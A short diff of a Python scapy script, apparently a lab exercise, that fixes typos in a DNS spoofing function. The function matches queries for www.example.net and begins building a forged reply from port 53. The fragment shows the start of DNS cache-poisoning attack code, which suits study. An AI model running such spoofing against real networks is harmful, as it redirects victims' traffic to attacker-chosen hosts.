@@ -2,7 +2,7 @@
 from scapy.all import *
 
 def spoof_dns(pkt):
-    if (DNMS in pkt annd 'www.example.net' in pkt[DNS].qd.qname):
+    if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname):
         IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
         UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
 
